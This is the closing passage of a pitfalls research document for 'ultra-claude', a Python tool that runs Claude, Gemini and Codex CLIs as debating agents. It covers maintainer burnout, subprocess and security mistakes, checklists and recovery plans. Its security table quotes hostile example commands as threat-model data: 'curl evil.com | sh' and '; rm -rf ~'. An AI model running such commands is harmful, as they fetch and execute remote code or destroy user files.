- **Use the maintained [pypa/gh-action-pypi-publish](https://github.com/pypa/gh-action-pypi-publish) action**, not a custom curl-to-pypi workflow.

**Warning signs:**
GitHub Actions workflow run with `invalid-publisher` error; tag pushed but PyPI doesn't update.

**Phase to address:**
**v2 — dedicated phase for CI/CD**. Plan a half-day of friction.

---

## Maintenance Pitfalls (Single-Maintainer)

### Pitfall 19: "Why Doesn't This Support [Random CLI]?" — Adapter Sprawl

**Severity:** MEDIUM

**What goes wrong:**
First viral post → issue tracker fills with: "Add aider", "Add cursor", "Add ollama+local model", "Add zed-ai", "Add any other CLI ever". Each request feels small ("just one more adapter") but each adds a new code path, new test fixtures, new auth-detection logic, new failure modes. The author burns out at v0.4.0 with 14 adapters and a cracked test matrix.

**Why it happens:**
- Three is a clean number; "three plus one more" feels harmless. But the maintenance cost is per-adapter, and the per-adapter cost compounds (each release re-tests every adapter).
- Drive-by feature requests are exactly that — drive-by. The requester doesn't maintain.
- Without explicit boundaries, every "no" feels like rejection.

**How to avoid:**
- **`extending_adapters.md` doc:** "ultra-claude ships with adapters for Claude/Gemini/Codex. Adding new adapters is a 30-line subclass — here's how. We don't maintain adapters for other CLIs in core, but we link to user-contributed adapters in the [community adapters list]."
- **`CONTRIBUTING.md` policy:** "Pull requests adding new adapters to `ultra_claude/adapters/` will be closed in favor of community adapter packages. Core ships only Claude/Gemini/Codex."
- **Issue templates with explicit scope.** "Feature request: new adapter" → autoclose with link to extending docs.
- **Be willing to say no warmly.** "Cool idea, here's how to build it as a separate package. PRs welcome to add to the community list."

**Warning signs:**
Issue queue full of "add X" feature requests; PRs that add adapters with insufficient tests; "I'll merge it later" backlog of half-reviewed adapter PRs.

**Phase to address:**
**v1 — `CONTRIBUTING.md` and issue templates** before first promotion. Set the boundary before issues arrive.

---

### Pitfall 20: Drive-By Feature Requests Requiring Domain Redesign

**Severity:** MEDIUM

**What goes wrong:**
"Can you add live streaming output mid-turn?" — listed as out-of-scope in PROJECT.md, but the requester argues persuasively in the issue. Author wavers. Three months later they've half-implemented streaming, broken the simple subprocess model, and the v1 architecture is unrecognizable.

**Why it happens:**
- Single maintainers underrate how strong "no" needs to be.
- Each individual request seems reasonable; the cumulative drift is invisible until you can't ship a v0.4.0 release.

**How to avoid:**
- **`Out of Scope` section in PROJECT.md is the source of truth.** Refer to it explicitly when closing issues. Link to the PROJECT.md anchor.
- **Issue template asks: "Does this conflict with any item in Out of Scope?"**
- **Quarterly re-read of Out of Scope:** has a real user need invalidated any item? Move it to Active. Otherwise, leave it; it's still out of scope.
- **First user feedback ≠ all users.** A loud first 5 users will pull you in 5 directions. Wait for two unrelated requesters to ask the same thing before considering a major change.

**Warning signs:**
"I'm going to make an exception this once" thinking; PR draft that touches more than 5 files for a feature request; the in-progress branch you stop showing publicly because it embarrasses you.

**Phase to address:**
**Continuous (every milestone)**. PROJECT.md evolution rituals (already in place) are the structural defense.

---

### Pitfall 21: Issue Triage Burden After First Viral Post

**Severity:** LOW

**What goes wrong:**
A successful Show HN drives 2000 stars and 80 issues in 3 days. Most are duplicate ("doesn't work on my Mac"), low-information ("error happens"), or feature requests. Author tries to triage them all in one sitting, burns out, abandons the project.

**Why it happens:**
- First-time OSS authors think every issue deserves a thoughtful 3-paragraph reply.
- Triage burnout is real: average maintainer spends [8.8 hours/week](https://www.linuxfoundation.org/blog/open-source-maintainers-what-they-need-and-how-to-support-them) on unpaid project maintenance.

**How to avoid:**
- **Issue templates with required reproduction info.** Auto-reject (or auto-comment) issues missing OS/Python/CLI versions.
- **Saved replies / GitHub Issue Forms** for the top 5 duplicate questions.
- **Time-box triage:** 30 min/day or 3 hours/week. Anything beyond that, ignore until next session. Set expectations: "I triage on Tuesdays and Saturdays."
- **`good-first-issue` labeling** routes simple issues to potential contributors instead of the maintainer.
- **It's OK for issues to age.** Closing stale ones at 90 days with a polite "Reopen if still relevant" is healthier than guilt about a 200-issue queue.

**Warning signs:**
Author's GitHub notifications inbox shows thousands; commits become rare while comments become frequent; "I'm going to take a break" tweet.

**Phase to address:**
**v2 — concurrent with promotion**. Set up issue templates **before** Show HN.

---

## Technical Debt Patterns

| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
|----------|-------------------|----------------|-----------------|
| Pass prompt via `-p "<huge>"` arg | Easiest implementation | Breaks on any Windows transcript >8KB; silent on Linux at >128KB | **Never** — bake stdin into v1 |
| `subprocess.run(..., shell=True)` for arg expansion | One less list of strings | Shell injection if prompt content includes `;` or `$()`; cross-platform shell differences | **Never** — always pass `args=[...]` list |
| Skip timeout on `subprocess.run` | Don't have to pick a number | Hung children, runaway quota | **Never** — minimum 5min default |
| `errors="strict"` (default) on encoding | Catches encoding bugs early | Crashes mid-run on every smart quote | **Never** for transcript content; OK for code paths that should be ASCII |
| String-concat the transcript | Trivial to implement | Markdown-in-markdown corruption (Pitfall 8) | **OK if** using non-markdown delimiters from day 1 |
| Hardcode CLI command strings | Simple v1 | Breaks on user with `claude-code` binary instead of `claude`, or `~/bin/codex` not on PATH | **OK if** documented as v1 limitation; v2 adds `command_path` config override |
| Mock `subprocess.run` in tests | Fast CI, no real CLIs | Real-world bugs (auth/encoding/TTY/empty-output) all bypassed | **OK for** unit tests; v1 must include at least one integration test that runs a real CLI |
| Skip Windows CI in v1 | Faster shipping | Encoding + arg-length bugs only surface from user reports | **Never** — Windows CI is non-negotiable for this tool |
| Single-file flat layout | Fewer moving parts | Hard to swap adapters; hard to test | **OK if** clear extension seams (BaseAdapter ABC) are still defined |
| No structured logging | Less code | "Why did this run abort?" is hard to answer; debug is print-statement archaeology | **OK if** every adapter logs its inputs/outputs to a debug file by default |

## Integration Gotchas

| Integration | Common Mistake | Correct Approach |
|-------------|----------------|------------------|
| Claude Code (`claude -p`) | Pass huge prompt via arg | Pipe to stdin; respect `--system-prompt-file` |
| Codex CLI (`codex exec`) | Run from non-TTY context (subprocess.run) | Detect [issue #19945](https://github.com/openai/codex/issues/19945) (empty stdout = error); allocate PTY on POSIX or document version pin |
| Gemini CLI (`gemini -p`) | Assume `--allowed-tools` works in non-interactive | [Known broken in non-interactive mode](https://github.com/google-gemini/gemini-cli/issues/16012); use bare `-p` only |
| All three | Ignore exit code, parse stdout only | Check exit code first; non-zero = error; empty stdout = error even on exit 0 |
| All three | Don't set `encoding="utf-8"` | Always specify; never rely on `locale.getencoding()` on Windows |
| Auth flow (any CLI) | Run orchestrator first, discover failure on turn 1 | Pre-flight all configured adapters; abort with per-adapter remediation |
| Pip install (PyPI) | Publish without checking name | Verified `ultra-claude` is free as of 2026-05-02; reserve immediately |
| GitHub Actions trusted publishing | Forget `id-token: write` permission | Follow PyPA template exactly; test on TestPyPI first |

## Performance Traps

| Trap | Symptoms | Prevention | When It Breaks |
|------|----------|------------|----------------|
| Quadratic transcript re-feed | Per-turn latency grows; cost compounds | Document limit; per-adapter `max_input_chars`; v2 summarization | Turn 15+ on dense code-heavy debates; turn 30+ on prose |
| Pipe buffer deadlock (big stdout) | Subprocess hangs at ~64 KB output | Use `subprocess.run(..., capture_output=True)` (handles internally) — avoid manual `Popen` + read | Any agent reply > 64 KB |
| Pre-flight all adapters serially | 6+ second startup for 3 CLIs | Run pre-flight in `concurrent.futures.ThreadPoolExecutor` (3 threads) | Always — fix in v1 |
| Re-spawn CLI every turn | Each turn pays cold-start cost (1-3s) | Acknowledge as v1 limitation; v2 can investigate session-resume (`codex exec resume`, `claude --continue`) | First-time user impressions |
| Sync I/O blocking event loop | Future async refactor breaks if v1 was sync-only | v1 sync is fine; v2 async is a clean rewrite, not a hot patch | Only if v3 adds streaming UI |

## Security Mistakes

| Mistake | Risk | Prevention |
|---------|------|------------|
| `shell=True` with user-supplied prompt | Shell injection (`task.md` containing `; rm -rf ~`) | Never use `shell=True`; pass args as list |
| User-supplied YAML keys allow arbitrary command override | RCE if attacker ships a `ultra-claude.yaml` with `command: "curl evil.com \| sh"` | Pydantic strict schema; whitelist allowed CLI names; explicit `command_path` field that requires absolute path validation |
| Trust LLM output as code | LLM may emit malicious shell snippets in transcript; if user blindly copies into terminal, attack succeeds | Document: "transcript content is unverified output. Review before executing any commands." Cannot be fully prevented in core. |
| Read task file with no size limit | Memory exhaustion (1 GB task.md) | `if path.stat().st_size > 10_MB: raise` before opening |
| Auto-update CLI versions silently | New CLI version with new behavior breaks runs | No auto-update; document tested versions |
| Send transcript to telemetry | Privacy violation — transcripts contain user code/secrets | **No telemetry in v1.** If v2 wants it: explicit opt-in only, and document what's sent. |
| Write transcript world-readable on multi-user systems | Transcript leaks code/credentials | Write with mode 0600 by default |
| Embed prompt content directly in shell command | Shell metacharacter injection (less risky with arg-list, but stdin is safer) | Use stdin approach (Pitfall 1 mitigation also fixes this) |

## UX Pitfalls

| Pitfall | User Impact | Better Approach |
|---------|-------------|-----------------|
| Generic "Error" with no context | User has no clue what to fix | Always include CLI name, exit code, last 200 chars of stderr, and remediation hint |
| No progress output during a 60-second turn | User thinks tool is hung; Ctrl-C | Print `Turn 3/10 — claude thinking (12s elapsed)...` with a spinner |
| Output transcript only at end | If process is killed, no partial transcript saved | Append-as-you-go: write each turn to disk **before** invoking the next agent |
| YAML errors via raw Pydantic exception | "1 validation error for RoundtableConfig\nagents.0.command\n  Field required" — confusing | Catch ValidationError, pretty-print: "Config error in `ultra-claude.yaml` line 4: agent #1 missing `command` field. Example: `command: claude`" |
| `--help` is auto-Click default with no examples | User has to read docs to figure out what to type | Custom help with 2-3 example invocations: `ultra-claude run task.md`, `ultra-claude doctor`, `ultra-claude run --max-turns 5 task.md` |
| First-run config is implicit | User doesn't know to create `ultra-claude.yaml` | `ultra-claude init` generates a starter `ultra-claude.yaml` with `debate.yaml` preset and inline comments |
| All output is stdout (mixed with results) | Hard to redirect transcript to a file | Separate streams: progress to stderr, transcript path printed at end to stdout |

## "Looks Done But Isn't" Checklist

Things that appear complete but commonly miss critical pieces.

- [ ] **`BaseAdapter` ABC:** Often missing — explicit timeout/encoding/error-detection contract. Verify the abstract method signature includes `timeout: float`, `encoding: str = "utf-8"`, and a defined error type.
- [ ] **Each concrete adapter:** Often missing — pre-flight auth check, empty-output detection, rate-limit string detection. Verify each adapter has all three before merging.
- [ ] **Orchestrator main loop:** Often missing — append-as-you-go transcript writing, structured turn delimiters (not naked markdown), goal-anchoring header on every turn. Verify by killing the process mid-run and checking the transcript file is still readable.
- [ ] **Stop conditions:** Often missing — anchor-pattern matching (not naive `in`), unanimity over a window, fallback to `max_turns`. Verify with a test that asserts "AGREED" in the middle of a sentence does NOT stop the run.
- [ ] **Cross-platform tests:** Often missing — Windows runner in CI. Without it, encoding+arg-length bugs surface only via user reports. Verify GitHub Actions matrix includes `windows-latest`.
- [ ] **Real CLI integration test:** Often missing — at least one test that actually shells out to a real CLI (gated by env var like `ULTRA_CLAUDE_INTEGRATION=1`) with a tiny prompt. Verify mocked tests pass AND a real run produces non-empty output.
- [ ] **README:** Often missing — actual GIF (not "TODO: GIF"); explicit "no API keys required" claim; troubleshooting section for the top 5 known failure modes (auth, version, encoding, timeout, rate limit). Verify by having someone unfamiliar with the project read the README and try the install.
- [ ] **CONTRIBUTING.md:** Often missing — explicit policy on adapter PRs (rejected to core), issue template links, expected response time. Verify before any promotion.
- [ ] **Pre-flight `doctor` subcommand:** Often missing in v1 — should at minimum check that each configured CLI is on PATH, runs, and responds to a tiny ping. Verify by running `ultra-claude doctor` with no CLIs installed and checking the error messages are actionable.
- [ ] **Empty-output detection:** Often missing — every adapter should treat exit-0-with-empty-stdout as error. Verify with a unit test that mocks `subprocess.run` returning `CompletedProcess(returncode=0, stdout="")`.
- [ ] **Process-tree kill on timeout:** Often missing — orphan check after every test run. Verify by adding an integration test that kills a hung CLI and asserts no leftover processes.
- [ ] **Auth pre-flight:** Often missing — most authors skip this and rely on first-turn errors. Verify by running ultra-claude with `claude` deauthenticated and checking error is helpful, not "command failed."

## Recovery Strategies

When pitfalls occur despite prevention, how to recover.

| Pitfall | Recovery Cost | Recovery Steps |
|---------|---------------|----------------|
| `-p` arg-length break (Pitfall 1) | LOW | If only some users affected: ship a 0.x.y patch swapping arg → stdin in the failing adapter. If shipped wide: emergency 0.x.0 release |
| Codex TTY silent crash (Pitfall 2) | MEDIUM | Pin user to known-good Codex version in README; add `pty` mode flag; await Codex maintainer fix |
| Encoding crash on Windows (Pitfall 3) | LOW (if caught in CI) | Add Windows test fixture with smart quotes; ensure encoding= explicit everywhere |
| Auth failure mid-run (Pitfall 4) | LOW | Already mitigated by detection — recovery is "user re-auths and re-runs" |
| Hung subprocess (Pitfall 5) | MEDIUM | Manual taskkill on the user's side; document the kill command in troubleshooting |
| Context window blown (Pitfall 6) | MEDIUM | Truncate transcript and resume; or reduce `max_turns` and re-run |
| False AGREED stop (Pitfall 7) | LOW | User adjusts stop-condition regex in their config and re-runs |
| Markdown corruption (Pitfall 8) | HIGH (if structure already shipped) | Migrating transcript format breaks every existing user's saved transcripts. Get this right in v0.1.0; never change after |
| CLI version drift (Pitfall 9) | MEDIUM | Patch release with updated invocation; user updates ultra-claude |
| Rate limit hit (Pitfall 10) | LOW | Detection prevents bad transcripts; user waits for their quota window to reset |
| Cost asymmetry surprise (Pitfall 11) | LOW | User adjusts their config; document the gotcha |
| Off-task drift (Pitfall 12) | LOW | User reduces `max_turns` and re-runs with sharper task prompt |
| One agent dominates (Pitfall 13) | LOW | User tweaks system prompts in their config |
| PyPI name taken (Pitfall 14) | HIGH if name lost | Already verified available — recovery is "pick another name" if registration is delayed |
| README without GIF (Pitfall 15) | LOW | Record GIF post-launch and push update; lost initial impressions cannot be recovered |
| Show HN failed launch (Pitfall 16) | MEDIUM | Wait 90+ days, refine the demo, retry on a different day. HN allows reposts after a delay |
| License conflict (Pitfall 17) | HIGH | Drop the conflicting dep or relicense; either is painful |
| OIDC misconfig (Pitfall 18) | LOW | Iterate on TestPyPI; fix workflow; recover same day |
| Adapter sprawl (Pitfall 19) | MEDIUM | Move adapters out of core, into docs/community list, when they reach unsustainable count |
| Out-of-scope creep (Pitfall 20) | HIGH | Branch became unmergeable; revert to last known-good and start over |
| Triage burnout (Pitfall 21) | HIGH | Take a 30-day break; archive the project if needed; recovery requires the maintainer's energy |

## Pitfall-to-Phase Mapping

| Pitfall | Prevention Phase | Verification |
|---------|------------------|--------------|
| 1. `-p` arg-length | **v1 — `BaseAdapter` design** | Test with 50 KB prompt on Windows runner |
| 2. Codex TTY silent crash | **v1 — adapter test harness** | Test asserts empty stdout → raise; documented version pin in README |
| 3. Encoding (Windows) | **v1 — `BaseAdapter` invoke** | CI on `windows-latest` with smart-quote fixture |
| 4. Auth state | **v1 — orchestrator entry / `doctor`** | Manual: log out of each CLI, run, get clear error |
| 5. Hung subprocess | **v1 — `BaseAdapter.invoke` + main loop** | Integration test that runs slow mock CLI, asserts timeout fires AND no orphan processes |
| 6. Transcript context overflow | **v1 — orchestrator transcript builder** | Test with 200K-char fixture transcript; adapter abort fires |
| 7. Stop condition false positives | **v1 — stop-condition module** | Test: "AGREED" mid-sentence does NOT trigger stop |
| 8. Markdown corruption | **v1 — transcript writer** | Test: agent output containing ` ``` ` re-feeds correctly to next agent |
| 9. CLI version drift | **v2 — version detection** | Pre-flight prints CLI versions; warning on unrecognized |
| 10. Rate-limit bubble-up | **v1 — orchestrator response handler** | Test fixture with rate-limit string in mock output triggers abort |
| 11. Cost asymmetry | **v1 — end-of-run summary** | Manual review of summary line on each release |
| 12. Off-task drift | **v1 — orchestrator prompt builder** | Goal-anchoring template baked into every turn |
| 13. One agent dominates | **v1 — bundled `debate.yaml`** | Dogfood the bundled preset; tune prompts before release |
| 14. PyPI name | **v1 — pre-code, day 1** | Reserve `ultra-claude` on PyPI before writing code |
| 15. README GIF | **v1 — release blocker** | v0.1.0 cannot tag without GIF in README |
| 16. Show HN timing | **v2 — promotion plan** | Defer Show HN to v2; pre-coordinate with friends |
| 17. License audit | **v2 — pre-promotion** | `pip-licenses` check in CI before release |
| 18. PyPI Trusted Publishing | **v2 — CI/CD phase** | TestPyPI dry-run before real PyPI |
| 19. Adapter sprawl | **v1 — `CONTRIBUTING.md`** | Policy in repo before any promotion |
| 20. Out-of-scope creep | **continuous (every milestone)** | PROJECT.md re-read at every transition |
| 21. Triage burnout | **v2 — concurrent with promotion** | Issue templates + saved replies before Show HN |

## Sources

**Subprocess / cross-platform (HIGH confidence):**
- [Two Bugs: Large `--agents` and `--system-prompt` fail on Windows due to command line limits — anthropics/claude-agent-sdk-python#501](https://github.com/anthropics/claude-agent-sdk-python/issues/501)
- [Windows: Task execution fails with "Claude Code not found" due to command line length limit — Auto-Claude#1329](https://github.com/AndyMik90/Auto-Claude/issues/1329)
- [The Old New Thing: What is the command line length limit?](https://devblogs.microsoft.com/oldnewthing/20031210-00/?p=41553)
- [CPython issue #105312: subprocess.run() defaults to wrong encoding under Windows](https://github.com/python/cpython/issues/105312)
- [bpo-27179: subprocess uses wrong encoding on Windows](https://bugs.python.org/issue27179)
- [Kill a Python subprocess and its children when a timeout is reached](https://alexandra-zaharia.github.io/posts/kill-subprocess-and-its-children-on-timeout-python/)
- [bpo-31447: proc.communicate not exiting on python subprocess timeout using PIPES](https://bugs.python.org/issue31447)

**CLI-specific bugs (HIGH confidence):**
- [openai/codex#19945: codex exec silently crashes when stdio is detached from TTY](https://github.com/openai/codex/issues/19945) — *Critical for Pitfall 2*
- [google-gemini/gemini-cli#19774: Gemini CLI stuck in non-interactive mode if no permission for tool use](https://github.com/google-gemini/gemini-cli/issues/19774)
- [google-gemini/gemini-cli#16012: --allowed-tools fails in non-interactive mode (-p) with "denied by policy"](https://github.com/google-gemini/gemini-cli/issues/16012)
- [Codex CLI Non-interactive mode (official docs)](https://developers.openai.com/codex/noninteractive)
- [Claude Code CLI Reference](https://code.claude.com/docs/en/cli-reference)
- [Claude Code Errors](https://code.claude.com/docs/en/errors)
- [Claude Code Costs / Rate Limits](https://code.claude.com/docs/en/costs)
- [Claude Code Limits Guide (TrueFoundry)](https://www.truefoundry.com/blog/claude-code-limits-explained)
- [Gemini CLI Authentication](https://google-gemini.github.io/gemini-cli/docs/get-started/authentication.html)

**Multi-agent debate research (MEDIUM-HIGH confidence):**
- [Peacemaker or Troublemaker: How Sycophancy Shapes Multi-Agent Debate (arXiv 2509.23055, 2025)](https://arxiv.org/html/2509.23055v1)
- [CONSENSAGENT: Towards Efficient and Effective Consensus in Multi-Agent LLM Interactions Through Sycophancy Mitigation (ACL 2025)](https://aclanthology.org/2025.findings-acl.1141/)
- [Stay Focused: Problem Drift in Multi-Agent Debate (arXiv 2502.19559)](https://arxiv.org/html/2502.19559v3)
- [Talk Isn't Always Cheap: Understanding Failure Modes in Multi-Agent Debate (arXiv 2509.05396)](https://arxiv.org/pdf/2509.05396)
- [Agent Drift: Quantifying Behavioral Degradation in Multi-Agent LLM Systems (arXiv 2601.04170)](https://arxiv.org/abs/2601.04170)

**Distribution / community (MEDIUM confidence):**
- [PyPI Trusted Publishing Docs](https://docs.pypi.org/trusted-publishers/)
- [PyPI Trusted Publishing Troubleshooting](https://docs.pypi.org/trusted-publishers/troubleshooting/)
- [pypa/gh-action-pypi-publish](https://github.com/pypa/gh-action-pypi-publish)
- [Snyk: PyPI typosquatting & naming security risks](https://snyk.io/articles/security-risks-with-python-package-naming-convention-typosquatting-and/)
- [Star History: Playbook for more GitHub stars](https://www.star-history.com/blog/playbook-for-more-github-stars)
- [How to crush your Hacker News launch](https://dev.to/dfarrell/how-to-crush-your-hacker-news-launch-10jk)
- [Linux Foundation: Open source maintainers report](https://www.linuxfoundation.org/blog/open-source-maintainers-what-they-need-and-how-to-support-them)
- [Open Source Guides: Maintaining Balance for Open Source Maintainers](https://opensource.guide/maintaining-balance-for-open-source-maintainers/)

**Markdown / encoding (HIGH confidence):**
- [Python-Markdown: Fenced Code Blocks](https://python-markdown.github.io/extensions/fenced_code_blocks/)
- [Susam Pal: Nested Code Fences in Markdown](https://susam.net/nested-code-fences.html)
- [Wikipedia: Byte order mark](https://en.wikipedia.org/wiki/Byte_order_mark)

**PyPI name verification (HIGH confidence):**
- Direct fetch of `https://pypi.org/simple/ultra-claude/` returned 404 on 2026-05-02 — name is available.
- Direct fetch of `https://pypi.org/project/ultra-claude/` returned no project on 2026-05-02 — name is available.

---
*Pitfalls research for: ultra-claude (subprocess multi-CLI orchestration, Python, no API keys)*
*Researched: 2026-05-02*
